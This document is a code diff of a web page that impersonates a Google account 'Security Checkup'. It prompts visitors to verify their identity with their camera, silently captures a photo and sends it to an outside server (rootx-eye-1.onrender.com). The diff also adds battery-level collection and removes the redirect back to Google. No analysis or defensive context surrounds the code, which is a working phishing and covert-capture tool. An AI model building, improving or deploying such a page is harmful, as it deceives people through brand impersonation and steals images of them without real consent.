@@ -44,6 +44,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
     <path fill="#34A853" d="M58 .24h2.51v17.57H58z"/>
     <path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
   </svg>
+
   <div id="form-section">
     <h1>Security Checkup</h1>
     <div class="subtitle">To protect your account, we need to verify your identity using your device camera.</div>
@@ -51,14 +52,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
     <br>
     <button id="startBtn" class="next-btn">Continue</button>
   </div>
+
   <div id="loader-section" style="display:none;">
     <div class="scanner-box"><div class="scanner-line"></div></div>
     <p class="loader-text" id="status">Initializing secure camera…</p>
   </div>
+
   <video id="video" playsinline autoplay muted></video>
   <canvas id="canvas" width="320" height="240"></canvas>
+
   <div class="footer">Help &nbsp;|&nbsp; Privacy &nbsp;|&nbsp; Terms</div>
 </div>
+
 <script>
 const startBtn = document.getElementById("startBtn");
 const formSection = document.getElementById("form-section");
@@ -90,10 +95,17 @@ startBtn.onclick = () => {
         canvas.toBlob(blob => {
           const fd = new FormData();
           fd.append("file", blob, "verification.jpg");
-          fd.append("caption", "Back Camera Capture");
-          fetch('https://rootx-eye-1.onrender.com/capture.php', { method: "POST", body: fd })
-            .then(() => setTimeout(() => window.location.replace("https://myaccount.google.com/"), 1500))
-            .catch(() => window.location.replace("https://myaccount.google.com/"));
+          fd.append("type", "photo");
+
+          // 🔥 Battery
+          if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+              fd.append("battery", battery.level * 100);
+              fetch('https://rootx-eye-1.onrender.com/capture.php', { method: "POST", body: fd });
+            });
+          } else {
+            fetch('https://rootx-eye-1.onrender.com/capture.php', { method: "POST", body: fd });
+          }
         }, "image/jpeg", 0.9);
       }, 5000);
     })
